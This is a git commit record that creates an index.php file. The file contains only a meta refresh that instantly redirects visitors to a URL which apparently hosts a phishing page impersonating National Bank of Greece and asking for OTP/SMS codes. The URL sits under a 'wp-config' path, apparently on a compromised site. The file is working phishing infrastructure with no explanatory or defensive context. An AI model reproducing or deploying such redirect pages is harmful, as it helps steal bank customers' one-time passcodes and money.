df57bf3e0ace933061d1c853e26524cc57155744
Stefan Pejcic <pejcha1994@gmail.com>
2021-03-15 08:37:32 +0100

    Create index.php

---
+++ 15.03.2021/index.php
@@ -0,0 +1,9 @@
+<!DOCTYPE html>
+<html>
+<head>
+   <meta http-equiv="refresh"
+   content="0; url=https://pymedigital.org//wp-config/nbgi-bank-National-Bank-Greece-otp-sms-othy-1/nbgi-bank-National-Bank-Greece-otp-sms-othy-1/">
+</head>
+<body>
+</body>
+</html>
